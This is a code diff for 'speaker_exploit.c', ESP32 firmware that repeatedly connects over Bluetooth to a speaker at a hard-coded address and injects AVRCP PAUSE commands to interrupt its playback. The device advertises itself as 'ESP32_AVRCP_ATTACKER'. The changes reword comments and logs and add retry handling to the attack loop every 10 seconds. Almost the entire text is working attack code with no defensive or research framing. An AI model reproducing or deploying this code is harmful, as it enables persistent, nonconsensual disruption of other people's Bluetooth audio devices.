@@ -1,4 +1,4 @@
-// speaker_exploit.c - ESP32 AVRCP forced pause attack to known MAC address (interval attack every 10s)
+// speaker_exploit.c - ESP32 attack: wait for speaker to disconnect and hijack with AVRCP PAUSE
 
 #include "nvs_flash.h"
 #include "esp_bt.h"
@@ -22,7 +22,7 @@ static void bt_app_a2d_cb(esp_a2d_cb_event_t event, esp_a2d_cb_param_t *param) {
     switch (event) {
         case ESP_A2D_CONNECTION_STATE_EVT: {
             if (param->conn_stat.state == ESP_A2D_CONNECTION_STATE_CONNECTED) {
-                ESP_LOGI(TAG, "Connected. Injecting PAUSE command");
+                ESP_LOGI(TAG, "Connected to speaker. Injecting PAUSE command.");
                 esp_avrc_ct_send_passthrough_cmd(0, ESP_AVRC_PT_CMD_PAUSE, ESP_AVRC_PT_CMD_STATE_PRESSED);
                 esp_avrc_ct_send_passthrough_cmd(0, ESP_AVRC_PT_CMD_PAUSE, ESP_AVRC_PT_CMD_STATE_RELEASED);
                 vTaskDelay(pdMS_TO_TICKS(500));
@@ -39,9 +39,12 @@ static void bt_app_a2d_cb(esp_a2d_cb_event_t event, esp_a2d_cb_param_t *param) {
 
 void attack_task(void *arg) {
     while (true) {
-        ESP_LOGI(TAG, "Attempting connection to target speaker...");
-        esp_a2d_source_connect(target_bda);
-        vTaskDelay(pdMS_TO_TICKS(10000)); // wait 10 seconds before next attempt
+        ESP_LOGI(TAG, "Trying to connect to speaker...");
+        esp_err_t err = esp_a2d_source_connect(target_bda);
+        if (err != ESP_OK) {
+            ESP_LOGW(TAG, "Connection failed (likely already paired), will retry in 10s");
+        }
+        vTaskDelay(pdMS_TO_TICKS(10000));
     }
 }
 
@@ -58,8 +61,6 @@ void app_main(void) {
 
     ESP_ERROR_CHECK(esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE));
     ESP_ERROR_CHECK(esp_bt_dev_set_device_name("ESP32_AVRCP_ATTACKER"));
-
-    // Removed: ESP_ERROR_CHECK(esp_bt_gap_register_callback(NULL));
 
     ESP_ERROR_CHECK(esp_a2d_register_callback(bt_app_a2d_cb));
     ESP_ERROR_CHECK(esp_a2d_source_init());
